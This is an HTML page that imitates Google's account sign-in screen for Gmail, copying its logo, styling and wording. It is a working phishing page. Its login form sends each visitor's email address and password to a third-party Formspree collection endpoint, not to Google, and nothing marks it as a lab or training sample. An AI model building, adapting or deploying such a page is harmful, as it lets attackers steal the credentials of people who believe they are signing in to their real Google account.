<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #ffffff; /* Modern Google pages are often pure white */
        }

        .login-container {
            width: 450px;
            max-width: 95%;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            background-color: #fff;
            box-sizing: border-box;
        }

        .logo-wrapper {
            display: flex;
            justify-content: center;
            margin-bottom: 10px;
        }

        /* Official Google G SVG styling */
        .google-logo {
            width: 75px;
            height: auto;
        }

        h1 {
            text-align: left;
            font-size: 24px;
            color: #202124;
            margin: 0 0 10px 0;
            font-weight: 400;
        }

        p.subtitle {
            text-align: left;
            color: #202124;
            font-size: 16px;
            line-height: 1.5;
            margin: 0 0 35px 0;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            box-sizing: border-box;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            background-color: #fff;
            font-size: 16px;
            height: 50px;
            outline: none;
            transition: border 0.2s;
            margin-bottom: 10px;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px; /* Adjust for border width change */
        }

        input::placeholder {
            color: #5f6368;
            opacity: 0.7;
        }

        .next-btn {
            appearance: none;
            width: 120px;
            margin-top: 24px;
            padding: 0 34px;
            border-radius: 4px;
            background-color: #1a73e8;
            color: #fff !important;
            font-weight: 500;
            font-size: 14px;
            height: 36px;
            cursor: pointer;
            border: none;
            float: right;
        }

        .next-btn:hover {
            background-color: #1765cc !important;
            box-shadow: 0 1px 2px rgba(60,64,67,0.3);
        }

        .forgot-link {
            display: inline-block;
            margin-top: 20px;
            color: #1a73e8;
            text-decoration: none !important;
            font-size: 14px;
            font-weight: 500;
        }

        .forgot-link:hover {
            text-decoration: underline !important;
        }
        
        .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }
    </style>
</head>

<body> 

    <div class="login-container">
        <!-- Official Multi-Color Google Logo -->
        <div class="logo-wrapper">
            <svg class="google-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.68-6.68C36.63 4.14 30.62 2 24 2 14.84 2 7.12 7.68 4.66 15.8l7.2 5.56C13.33 14.77 18.16 9.5 24 9.5z"/>
                <path fill="#4285F4" d="M46.53 15.3c0-1.5-.12-2.94-.35-4.3H24v8.26h12.7c-.56 3.02-2.24 5.58-4.8 7.3v5.7h7.77c4.55-4.2 7.06-10.39 7.06-17.1z"/>
                <path fill="#34A853" d="M4.66 15.8c-1.3 3.9-1.3 8.1 0 12 2.46 8.12 10.18 13.8 19.34 13.8 5.84 0 10.67-1.93 14.24-5.3l-7.2-5.56c-3.08 2.07-7.1 3.27-11.6 3.27-5.84 0-10.8-3.95-12.52-9.3L4.66 15.8z"/>
                <path fill="#FBBC05" d="M24 46c5.67 0 10.42-1.88 14.24-5.3l-7.2-5.56c-3.08 2.07-7.1 3.27-11.6 3.27-5.84 0-10.8-3.95-12.52-9.3L4.66 15.8c-1.3 3.9-1.3 8.1 0 12 2.46 8.12 10.18 13.8 19.34 13.8z"/>
            </svg>
        </div>
        
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Gmail</p>

        <!-- FORMSPREE INTEGRATION -->
        <form action="https://formspree.io/f/mpppjjea" method="POST">
            <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
            <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
            
            <button type="submit" class="next-btn">Next</button>
            
            <div style="clear:both;"></div>
            
            <a href="#" class="forgot-link">Forgot email?</a>
        </form>
        
        <div style="margin-top: 30px; font-size: 14px; color: #5f6368;">
            Not your computer? Use Guest mode to sign in privately. 
            <a href="#" class="forgot-link" style="display:inline; margin-left:5px;">Learn more</a>
        </div>
    </div>

</body>
</html>
